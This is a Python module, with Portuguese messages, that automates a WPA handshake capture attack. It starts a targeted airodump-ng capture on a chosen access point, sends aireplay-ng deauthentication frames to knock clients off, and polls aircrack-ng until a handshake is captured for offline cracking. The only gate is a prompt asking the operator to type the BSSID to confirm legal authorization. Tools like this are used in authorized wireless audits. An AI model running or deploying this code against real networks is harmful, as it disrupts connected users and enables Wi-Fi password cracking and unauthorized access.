import glob
import logging
import os
import shutil
import signal
import subprocess
import time
from typing import Dict, Optional

logger = logging.getLogger(__name__)

_active_captures: Dict[str, subprocess.Popen] = {}


def confirm_authorization(bssid: str, essid: str) -> bool:
 
    print("\n" + "!" * 50)
    print(" AVISO DE SEGURANÇA E LEGALIDADE ")
    print("!" * 50)
    print(f"Alvo: {essid} [{bssid}]")
    print("\nVocê confirma que possui autorização legal para auditar esta rede?")

    confirm = input(f"Para confirmar, digite o BSSID do alvo ({bssid}): ").strip()

    if confirm.lower() == bssid.lower():
        logger.info("Autorização confirmada para o alvo %s", bssid)
        return True

    logger.warning("Confirmação incorreta. Operação abortada.")
    return False


def start_capture(monitor_interface: str, bssid: str, channel: str, output_prefix: str) -> str:

    if shutil.which("airodump-ng") is None:
        raise RuntimeError("airodump-ng não encontrado no PATH.")

    prefix = output_prefix[:-4] if output_prefix.endswith(".cap") else output_prefix

    cmd = [
        "airodump-ng",
        "--bssid", bssid,
        "--channel", str(channel),
        "--write", prefix,
        "--output-format", "pcap",
        monitor_interface,
    ]

    logger.info("Iniciando captura direcionada a %s (canal %s)...", bssid, channel)
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=os.setsid,
    )

    cap_file: Optional[str] = None
    for _ in range(20):
        matches = sorted(glob.glob(f"{prefix}-*.cap"))
        if matches:
            cap_file = matches[-1]
            break
        time.sleep(0.5)

    if cap_file is None:
        _terminate(proc)
        raise RuntimeError(
            f"airodump-ng não gerou nenhum arquivo .cap para o prefixo '{prefix}'. "
            f"Verifique se '{monitor_interface}' está em modo monitor e no canal {channel}."
        )

    _active_captures[cap_file] = proc
    logger.info("Captura em andamento: %s", cap_file)
    return cap_file


def send_deauth(monitor_interface: str, bssid: str, client_mac: Optional[str] = None, count: int = 5) -> None:

    if shutil.which("aireplay-ng") is None:
        raise RuntimeError("aireplay-ng não encontrado no PATH.")

    cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
    if client_mac:
        cmd.extend(["-c", client_mac])
    cmd.append(monitor_interface)

    logger.info("Enviando %d pacotes de desautenticação para %s...", count, bssid)
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30, check=False)
        if result.returncode != 0:
            logger.warning("aireplay-ng retornou código %s: %s", result.returncode, result.stderr.strip())
    except subprocess.TimeoutExpired:
        logger.warning("aireplay-ng excedeu o tempo limite.")


def wait_for_handshake(cap_file: str, timeout: int = 120, check_interval: int = 5) -> bool:
 
    if shutil.which("aircrack-ng") is None:
        raise RuntimeError("aircrack-ng não encontrado no PATH.")

    logger.info("Aguardando captura do handshake (timeout: %ss)...", timeout)
    start_time = time.time()
    found = False

    try:
        while (time.time() - start_time) < timeout:
            if os.path.isfile(cap_file) and os.path.getsize(cap_file) > 0:
                result = subprocess.run(
                    ["aircrack-ng", cap_file],
                    capture_output=True, text=True, timeout=30, check=False,
                )
                if "WPA handshake" in result.stdout:
                    logger.info("Handshake detectado com sucesso!")
                    found = True
                    break

            time.sleep(check_interval)
            logger.debug("Ainda procurando handshake...")

        if not found:
            logger.warning("Timeout atingido. Handshake não capturado.")

        return found

    finally:
        proc = _active_captures.pop(cap_file, None)
        if proc:
            _terminate(proc)


def _terminate(proc: subprocess.Popen) -> None:
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    except ProcessLookupError:
        return
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
        except ProcessLookupError:
            pass
        proc.wait()